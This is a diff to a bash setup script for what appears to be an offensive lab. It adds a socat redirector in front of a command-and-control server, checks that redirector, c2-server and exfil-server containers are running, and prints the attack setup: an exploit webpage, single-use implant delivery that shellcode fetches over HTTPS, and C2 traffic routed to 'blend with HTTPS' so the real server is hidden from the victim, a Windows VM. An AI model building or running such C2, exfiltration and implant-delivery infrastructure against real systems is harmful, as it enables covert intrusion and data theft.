@@ -160,6 +160,7 @@ echo -e "${GREEN}[+] Ready to rebuild.${NC}"
 # ── 5. Check for port conflicts ───────────────
 echo ""
 echo -e "${YELLOW}[*] Checking for port conflicts (443, 8443, 8888)...${NC}"
+echo -e "    ${CYAN}(Port 443 is now owned by the redirector container — c2-server has no direct host port)${NC}"
 
 CONFLICT=0
 for PORT in 443 8443 8888; do
@@ -193,7 +194,7 @@ echo -e "${YELLOW}[*] Verifying containers started...${NC}"
 sleep 3
 
 ALL_UP=1
-for NAME in c2-server exfil-server; do
+for NAME in redirector c2-server exfil-server; do
     STATUS=$(docker inspect --format='{{.State.Status}}' "$NAME" 2>/dev/null || echo "missing")
     if [ "$STATUS" = "running" ]; then
         echo -e "    ${GREEN}[+] $NAME is running${NC}"
@@ -209,14 +210,15 @@ echo -e "${CYAN}================================================${NC}"
 echo -e "${CYAN}                    Summary                     ${NC}"
 echo -e "${CYAN}================================================${NC}"
 echo ""
-echo -e "  C2 listener (mTLS)  → ${GREEN}localhost:443${NC}   (TLS 1.3, blends with HTTPS)"
-echo -e "  Exploit webpage     → ${GREEN}http://localhost:8888${NC}"
-echo -e "  Implant delivery    → ${GREEN}https://localhost:8443/update/<token>${NC}  (HTTPS, single-use)"
+echo -e "  Traffic path (C2):  victim → ${GREEN}redirector:443${NC} → ${GREEN}c2-server:443${NC}  (socat raw TCP forward)"
+echo -e "  Exploit webpage  → ${GREEN}http://localhost:8888${NC}"
+echo -e "  Implant delivery → ${GREEN}https://localhost:8443/update/<token>${NC}  (HTTPS, single-use)"
 echo ""
 echo -e "  From Windows VM:"
 echo -e "  Exploit webpage  → ${GREEN}http://${HOST_IP}:8888${NC}"
 echo -e "  Download implant → ${GREEN}https://${HOST_IP}:8443/update/${DOWNLOAD_TOKEN}${NC}  (in shellcode)"
-echo -e "  C2 connects to   → ${GREEN}${HOST_IP}:443${NC}   (baked into implant.exe)"
+echo -e "  C2 connects to   → ${GREEN}${HOST_IP}:443${NC}   (redirector — baked into implant.exe)"
+echo -e "  Real C2 server   → ${CYAN}backnet only — not directly reachable from victim${NC}"
 echo ""
 echo -e "  Attach to C2 controller:"
 echo -e "    ${CYAN}sudo docker attach c2-server${NC}"
